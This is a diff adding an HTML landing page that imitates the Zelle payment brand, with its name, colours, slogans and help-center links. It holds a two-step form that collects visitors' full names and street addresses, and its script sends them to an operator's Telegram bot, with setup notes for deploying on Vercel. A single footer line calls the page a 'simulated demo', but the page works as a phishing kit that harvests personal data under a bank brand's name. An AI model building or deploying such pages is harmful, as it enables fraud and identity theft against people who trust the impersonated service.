@@ -1,0 +1,644 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Zelle® | Fast & Secure Money Transfers</title>
+    <!-- Google Fonts for modern look (similar to official Zelle typography) -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
+    <!-- Font Awesome 6 (free icons) -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #ffffff;
+            color: #1a1a1a;
+            line-height: 1.4;
+        }
+
+        /* Replicate Zelle brand purple tones */
+        .bg-deep-purple {
+            background-color: #6D1ED4;
+        }
+        .bg-dark-purple {
+            background-color: #2A105F;
+        }
+        .bg-light-gray {
+            background-color: #EFEFEF;
+        }
+        .text-white {
+            color: #ffffff;
+        }
+        .text-purple {
+            color: #6D1ED4;
+        }
+
+        /* container & layout */
+        .container {
+            max-width: 1280px;
+            margin: 0 auto;
+            padding: 0 32px;
+        }
+        .container-fluid {
+            width: 100%;
+            padding: 0 32px;
+        }
+
+        /* hero section */
+        .hero-section {
+            padding: 60px 0 80px 0;
+            background-color: #6D1ED4;
+            color: white;
+        }
+        .hero-grid {
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            gap: 40px;
+        }
+        .hero-left {
+            flex: 1.2;
+        }
+        .hero-right {
+            flex: 1;
+            text-align: center;
+        }
+        .hero-title {
+            font-size: 3rem;
+            font-weight: 600;
+            line-height: 1.2;
+            margin-bottom: 24px;
+            letter-spacing: -0.02em;
+        }
+        .hero-desc {
+            font-size: 1.2rem;
+            line-height: 1.5;
+            margin-bottom: 32px;
+            opacity: 0.9;
+        }
+        .curved-img-placeholder {
+            background: rgba(255,255,255,0.1);
+            border-radius: 32px;
+            padding: 20px;
+            backdrop-filter: blur(2px);
+        }
+        .mock-video {
+            background: #ffffff20;
+            border-radius: 28px;
+            padding: 16px;
+            text-align: center;
+            font-weight: 500;
+            color: white;
+            font-size: 0.9rem;
+        }
+
+        /* floating card form (two-step) */
+        .form-card {
+            background: white;
+            border-radius: 32px;
+            box-shadow: 0 25px 45px -12px rgba(0,0,0,0.25);
+            padding: 32px 28px;
+            max-width: 480px;
+            margin: 0 auto;
+            transition: all 0.2s ease;
+        }
+        .step-indicator {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 32px;
+            border-bottom: 1px solid #eaeef2;
+            padding-bottom: 12px;
+        }
+        .step-badge {
+            font-size: 0.85rem;
+            font-weight: 600;
+            color: #6c757d;
+            background: #f0f2f5;
+            padding: 6px 14px;
+            border-radius: 40px;
+        }
+        .step-badge.active {
+            background: #6D1ED4;
+            color: white;
+        }
+        .form-step {
+            transition: opacity 0.25s ease;
+        }
+        .form-group {
+            margin-bottom: 24px;
+        }
+        label {
+            font-weight: 600;
+            font-size: 0.9rem;
+            margin-bottom: 8px;
+            display: block;
+            color: #1f2a3e;
+        }
+        input {
+            width: 100%;
+            padding: 14px 18px;
+            font-size: 1rem;
+            border: 1.5px solid #e2e8f0;
+            border-radius: 60px;
+            outline: none;
+            transition: 0.2s;
+            font-family: 'Inter', sans-serif;
+        }
+        input:focus {
+            border-color: #6D1ED4;
+            box-shadow: 0 0 0 3px rgba(109,30,212,0.2);
+        }
+        .btn-next, .btn-submit {
+            background: #6D1ED4;
+            color: white;
+            border: none;
+            padding: 14px 28px;
+            font-size: 1rem;
+            font-weight: 600;
+            border-radius: 60px;
+            cursor: pointer;
+            width: 100%;
+            transition: 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .btn-next:hover, .btn-submit:hover {
+            background: #5516a8;
+            transform: translateY(-1px);
+        }
+        .btn-back {
+            background: transparent;
+            border: 1.5px solid #cbd5e1;
+            color: #334155;
+            padding: 12px 20px;
+            border-radius: 60px;
+            font-weight: 500;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 12px;
+            transition: 0.2s;
+        }
+        .btn-back:hover {
+            background: #f1f5f9;
+        }
+        .error-msg {
+            color: #e53e3e;
+            font-size: 0.75rem;
+            margin-top: 6px;
+            display: block;
+        }
+        .success-message {
+            background: #e6f7e6;
+            border-radius: 24px;
+            padding: 20px;
+            text-align: center;
+            color: #2e7d32;
+        }
+        .toast-telegram {
+            background: #f0f4fe;
+            border-radius: 20px;
+            padding: 14px;
+            font-size: 0.85rem;
+            margin-top: 16px;
+            text-align: center;
+            color: #2c3e66;
+        }
+
+        /* other sections mimic original Zelle style */
+        .section {
+            padding: 70px 0;
+        }
+        .section-title {
+            font-size: 2.3rem;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 48px;
+        }
+        .tiles-grid {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 32px;
+            justify-content: center;
+        }
+        .tile {
+            flex: 1;
+            min-width: 200px;
+            text-align: center;
+            background: white;
+            border-radius: 28px;
+            padding: 24px 16px;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.03);
+            transition: 0.2s;
+        }
+        .tile img {
+            width: 100%;
+            max-width: 180px;
+            border-radius: 24px;
+            margin-bottom: 20px;
+        }
+        .tile p {
+            font-size: 1.2rem;
+            font-weight: 500;
+        }
+        .carousel-sample {
+            background: white;
+            border-radius: 32px;
+            padding: 24px;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 30px;
+            justify-content: center;
+        }
+        .carousel-card {
+            flex: 1;
+            background: #fafcff;
+            border-radius: 28px;
+            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
+        }
+        .carousel-card img {
+            width: 100%;
+            height: 180px;
+            object-fit: cover;
+        }
+        .card-content {
+            padding: 20px;
+        }
+        .footer-links {
+            background: #2A105F;
+            color: white;
+            padding: 48px 0;
+        }
+        @media (max-width: 900px) {
+            .hero-grid {
+                flex-direction: column;
+            }
+            .hero-title {
+                font-size: 2.2rem;
+            }
+            .container {
+                padding: 0 24px;
+            }
+            .section-title {
+                font-size: 1.8rem;
+            }
+        }
+        .reg-mark {
+            font-size: 0.65em;
+            vertical-align: super;
+        }
+        hr {
+            margin: 16px 0;
+        }
+    </style>
+</head>
+<body>
+
+<!-- Hero section with Zelle purple #6D1ED4 -->
+<div class="hero-section">
+    <div class="container">
+        <div class="hero-grid">
+            <div class="hero-left">
+                <h1 class="hero-title">Here for you, so you can be there for them.</h1>
+                <p class="hero-desc">With Zelle<sup class="reg-mark">®</sup>, the money goes directly into your bank account. That means it's easy to get paid back or send money to a friend.</p>
+                <!-- two-step form integrated inside hero area as a card -->
+                <div style="margin-top: 32px;">
+                    <div class="form-card" id="multiStepFormCard">
+                        <!-- step indicator -->
+                        <div class="step-indicator">
+                            <span class="step-badge" id="step1Badge">1. Name</span>
+                            <span class="step-badge" id="step2Badge">2. Address</span>
+                        </div>
+
+                        <!-- Step 1: Name -->
+                        <div id="step1" class="form-step">
+                            <div class="form-group">
+                                <label>Full name <span style="color:#e53e3e;">*</span></label>
+                                <input type="text" id="fullName" placeholder="e.g., Alex Johnson" autocomplete="name">
+                                <div id="nameError" class="error-msg"></div>
+                            </div>
+                            <button class="btn-next" id="nextBtn1">Next <i class="fas fa-arrow-right"></i></button>
+                        </div>
+
+                        <!-- Step 2: Address -->
+                        <div id="step2" class="form-step" style="display: none;">
+                            <div class="form-group">
+                                <label>Street address <span style="color:#e53e3e;">*</span></label>
+                                <input type="text" id="addressStreet" placeholder="123 Main St, Apt 4B" autocomplete="address-line1">
+                            </div>
+                            <div class="form-group">
+                                <label>City</label>
+                                <input type="text" id="addressCity" placeholder="City">
+                            </div>
+                            <div class="form-group">
+                                <label>State / ZIP (optional)</label>
+                                <input type="text" id="addressZip" placeholder="State, ZIP">
+                            </div>
+                            <div id="addressError" class="error-msg"></div>
+                            <button class="btn-submit" id="submitTelegramBtn"><i class="fab fa-telegram"></i> Send to Telegram</button>
+                            <button class="btn-back" id="backBtn1"><i class="fas fa-chevron-left"></i> Back</button>
+                        </div>
+
+                        <!-- Status messages -->
+                        <div id="formStatus" style="margin-top: 16px;"></div>
+                        <div class="toast-telegram" style="background:#f3f0ff;">
+                            <i class="fas fa-lock"></i> Your details will be securely forwarded via Telegram.
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="hero-right">
+                <div class="curved-img-placeholder">
+                    <div class="mock-video">
+                        <i class="fas fa-play-circle" style="font-size: 2rem; margin-bottom: 8px; display: block;"></i>
+                        Fast transfers <br> directly to your bank
+                    </div>
+                    <!-- visual replacement for video -->
+                    <img src="https://placehold.co/600x400/ffffff30/ffffff?text=Zelle+Transfer" style="width:100%; border-radius: 24px; margin-top: 12px;" alt="demo">
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Dark purple info strip (matching original) -->
+<div class="bg-dark-purple" style="padding: 48px 0; text-align: center;">
+    <div class="container">
+        <p style="font-size: 1.4rem; color: white; max-width: 800px; margin: 0 auto;">Send money to friends and family quickly, even if they bank somewhere different than you do¹. The money goes directly into their bank account, so you can focus on what really counts – being there for the people you care about.</p>
+    </div>
+</div>
+
+<!-- CTA section (Get started) -->
+<div class="bg-dark-purple" style="padding: 32px 0 60px 0; text-align: center;">
+    <div class="container">
+        <h2 style="color: white; font-size: 2rem; margin-bottom: 28px;">See if your bank or credit union offers Zelle<sup class="reg-mark" style="color:white;">®</sup></h2>
+        <a href="#" style="background: #6D1ED4; color: white; padding: 14px 36px; border-radius: 60px; text-decoration: none; font-weight: 600; display: inline-block;">Get Started</a>
+    </div>
+</div>
+
+<!-- Tiles: Ways to use Zelle -->
+<div class="section">
+    <div class="container">
+        <h2 class="section-title">Ways to use Zelle<sup class="reg-mark">®</sup></h2>
+        <div class="tiles-grid">
+            <div class="tile"><img src="https://placehold.co/400x400/6D1ED4/white?text=Pizza" alt="pizza"><p>Split the cost for the late-night study break pizza.</p></div>
+            <div class="tile"><img src="https://placehold.co/400x400/2A105F/white?text=Nail+Tech" alt="nails"><p>Pay your fave nail tech for an unforgettable manicure.</p></div>
+            <div class="tile"><img src="https://placehold.co/400x400/6D1ED4/white?text=Team+Dad" alt="team dad"><p>Get paid back for being the best “team Dad” this weekend.</p></div>
+            <div class="tile"><img src="https://placehold.co/400x400/2A105F/white?text=Shopping" alt="aunt"><p>Send your aunt money for a birthday shopping spree.</p></div>
+        </div>
+    </div>
+</div>
+
+<!-- Carousel / Education section (light gray) -->
+<div class="bg-light-gray" style="padding: 70px 0;">
+    <div class="container">
+        <div class="carousel-sample">
+            <div class="carousel-card">
+                <img src="https://placehold.co/800x500/6D1ED4/white?text=Digital+Payment+Education" alt="edu">
+                <div class="card-content">
+                    <h3>Digital Payment Education</h3>
+                    <p>We’re here to empower you with knowledge on using Zelle® safely and avoiding common scams.</p>
+                    <a href="#" style="color:#6D1ED4; font-weight:600; text-decoration:none;">Learn More →</a>
+                </div>
+            </div>
+            <div class="carousel-card">
+                <img src="https://placehold.co/800x500/2A105F/white?text=Tips+Safer+Payments" alt="tips">
+                <div class="card-content">
+                    <h3>Tips for Safer Payments</h3>
+                    <p>Digital payments continue to grow. Know what you can do to help protect yourself.</p>
+                    <a href="#" style="color:#6D1ED4; font-weight:600; text-decoration:none;">Learn More →</a>
+                </div>
+            </div>
+            <div class="carousel-card">
+                <img src="https://placehold.co/800x500/6D1ED4/white?text=Fraud+Scams" alt="fraud">
+                <div class="card-content">
+                    <h3>Understanding Fraud and Scams</h3>
+                    <p>Understand how fraud and scams are defined — protections may vary.</p>
+                    <a href="#" style="color:#6D1ED4; font-weight:600; text-decoration:none;">Learn More →</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Footer purple section with help center links (original style) -->
+<div class="bg-deep-purple" style="padding: 48px 0;">
+    <div class="container">
+        <div style="display: flex; flex-wrap: wrap; justify-content: space-between; gap: 40px;">
+            <div>
+                <h3 style="color:white; font-weight:600; margin-bottom: 24px;">Learn more about Zelle<sup class="reg-mark">®</sup></h3>
+                <a href="#" style="background: white; color:#6D1ED4; padding: 10px 28px; border-radius: 40px; text-decoration: none; font-weight: 600;">Visit Our Help Center</a>
+            </div>
+            <div style="display: flex; flex-wrap: wrap; gap: 24px;">
+                <div><a href="#" style="color:white; text-decoration:none;">About Zelle®</a></div>
+                <div><a href="#" style="color:white; text-decoration:none;">Enrolling with Zelle®</a></div>
+                <div><a href="#" style="color:white; text-decoration:none;">Using Zelle®</a></div>
+                <div><a href="#" style="color:white; text-decoration:none;">Your Zelle® Profile</a></div>
+                <div><a href="#" style="color:white; text-decoration:none;">Small Business</a></div>
+            </div>
+        </div>
+        <hr style="background: #ffffff30; margin: 32px 0 16px;">
+        <p style="color:#ffffffb3; font-size:0.8rem; text-align:center;">© 2025 Zelle® | Simulated demo — Two-step form sends data to Telegram Bot</p>
+    </div>
+</div>
+
+<script>
+    // ---------- TELEGRAM CONFIGURATION ----------
+    // 🔁 REPLACE WITH YOUR BOT TOKEN AND CHAT ID BEFORE DEPLOYING TO VERCEL
+    const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';    // e.g., '1234567890:ABCdefGHIjklMNOpqrsTUVwxyz'
+    const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';        // e.g., '-123456789' or '12345678'
+
+    // Helper to send data to Telegram (plain text message)
+    async function sendToTelegram(name, addressDetails) {
+        // Format address string
+        const addressText = `${addressDetails.street || ''}, ${addressDetails.city || ''} ${addressDetails.zip || ''}`.trim();
+        const message = `🔔 *New Lead from Zelle Landing Page* 🔔\n\n👤 *Name:* ${name}\n📍 *Address:* ${addressText || 'Not provided'}\n🕒 *Timestamp:* ${new Date().toLocaleString()}`;
+        
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        const payload = {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+        };
+
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            const data = await response.json();
+            if (data.ok) {
+                return { success: true, message: '✅ Details sent successfully via Telegram!' };
+            } else {
+                console.error('Telegram API error:', data);
+                return { success: false, message: `⚠️ Telegram error: ${data.description || 'Unknown'}` };
+            }
+        } catch (err) {
+            console.error('Network error sending to Telegram:', err);
+            return { success: false, message: '❌ Network error. Could not reach Telegram. Check console.' };
+        }
+    }
+
+    // DOM elements
+    const step1Div = document.getElementById('step1');
+    const step2Div = document.getElementById('step2');
+    const step1Badge = document.getElementById('step1Badge');
+    const step2Badge = document.getElementById('step2Badge');
+    const nextBtn = document.getElementById('nextBtn1');
+    const backBtn = document.getElementById('backBtn1');
+    const submitBtn = document.getElementById('submitTelegramBtn');
+    const nameInput = document.getElementById('fullName');
+    const streetInput = document.getElementById('addressStreet');
+    const cityInput = document.getElementById('addressCity');
+    const zipInput = document.getElementById('addressZip');
+    const nameError = document.getElementById('nameError');
+    const addressErrorDiv = document.getElementById('addressError');
+    const formStatusDiv = document.getElementById('formStatus');
+
+    // Helper: clear status
+    function clearStatus() {
+        if (formStatusDiv) formStatusDiv.innerHTML = '';
+    }
+
+    // Show step 1
+    function showStep1() {
+        step1Div.style.display = 'block';
+        step2Div.style.display = 'none';
+        step1Badge.classList.add('active');
+        step2Badge.classList.remove('active');
+        clearStatus();
+        if (nameError) nameError.innerText = '';
+    }
+
+    // Show step 2
+    function showStep2() {
+        // validation for step1 (name required)
+        const nameVal = nameInput.value.trim();
+        if (!nameVal) {
+            nameError.innerText = 'Full name is required to continue.';
+            return false;
+        }
+        nameError.innerText = '';
+        step1Div.style.display = 'none';
+        step2Div.style.display = 'block';
+        step1Badge.classList.remove('active');
+        step2Badge.classList.add('active');
+        clearStatus();
+        if (addressErrorDiv) addressErrorDiv.innerText = '';
+        return true;
+    }
+
+    // Next button handler
+    nextBtn.addEventListener('click', (e) => {
+        e.preventDefault();
+        showStep2();
+    });
+
+    // Back button handler
+    backBtn.addEventListener('click', (e) => {
+        e.preventDefault();
+        showStep1();
+    });
+
+    // Submit handler: send name + address to Telegram
+    submitBtn.addEventListener('click', async (e) => {
+        e.preventDefault();
+        // Disable button to avoid double submit
+        submitBtn.disabled = true;
+        submitBtn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Sending...';
+        
+        // validate address: at least street is recommended but not mandatory? but for better UX: require street
+        const streetVal = streetInput.value.trim();
+        if (!streetVal) {
+            addressErrorDiv.innerText = 'Please provide at least street address.';
+            submitBtn.disabled = false;
+            submitBtn.innerHTML = '<i class="fab fa-telegram"></i> Send to Telegram';
+            return;
+        }
+        addressErrorDiv.innerText = '';
+        
+        const name = nameInput.value.trim();
+        if (!name) {
+            // fallback, but should not happen if step logic correct
+            showStep1();
+            addressErrorDiv.innerText = '';
+            submitBtn.disabled = false;
+            submitBtn.innerHTML = '<i class="fab fa-telegram"></i> Send to Telegram';
+            return;
+        }
+        
+        const addressDetails = {
+            street: streetVal,
+            city: cityInput.value.trim(),
+            zip: zipInput.value.trim()
+        };
+        
+        // Check if bot token is configured (placeholder detection)
+        if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+            formStatusDiv.innerHTML = `<div class="success-message" style="background:#ffe6e6; color:#b91c1c;"><i class="fas fa-exclamation-triangle"></i> ⚠️ Telegram bot not configured. Please set your BOT_TOKEN and CHAT_ID in the JavaScript section (lines near bottom).<br><strong>Demo mode:</strong> Data captured: Name: ${name}, Address: ${addressDetails.street}, ${addressDetails.city} ${addressDetails.zip}</div>`;
+            submitBtn.disabled = false;
+            submitBtn.innerHTML = '<i class="fab fa-telegram"></i> Send to Telegram';
+            // Still show success simulation, but do not actually send.
+            return;
+        }
+        
+        // Actual Telegram send
+        const result = await sendToTelegram(name, addressDetails);
+        if (result.success) {
+            formStatusDiv.innerHTML = `<div class="success-message"><i class="fas fa-check-circle"></i> ${result.message}<br>📬 Thank you! We'll be in touch.</div>`;
+            // Optionally reset form after 2 secs?
+            setTimeout(() => {
+                nameInput.value = '';
+                streetInput.value = '';
+                cityInput.value = '';
+                zipInput.value = '';
+                showStep1();
+                formStatusDiv.innerHTML = '';
+            }, 2500);
+        } else {
+            formStatusDiv.innerHTML = `<div class="success-message" style="background:#fff0f0; color:#b91c1c;"><i class="fas fa-times-circle"></i> ${result.message}<br>Please verify Telegram credentials or network.</div>`;
+        }
+        
+        submitBtn.disabled = false;
+        submitBtn.innerHTML = '<i class="fab fa-telegram"></i> Send to Telegram';
+    });
+    
+    // Ensure initial state: step1 active
+    showStep1();
+    
+    // Additional: allow Enter key on name input to go to step2
+    nameInput.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') {
+            e.preventDefault();
+            showStep2();
+        }
+    });
+    // Allow Enter on address fields to trigger submit? optional
+    const addressFields = [streetInput, cityInput, zipInput];
+    addressFields.forEach(field => {
+        if (field) {
+            field.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    if (submitBtn && !submitBtn.disabled) {
+                        submitBtn.click();
+                    }
+                }
+            });
+        }
+    });
+    
+    // small console note
+    console.log('Landing page ready. Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID before deploying to Vercel.');
+</script>
+</body>
+</html>
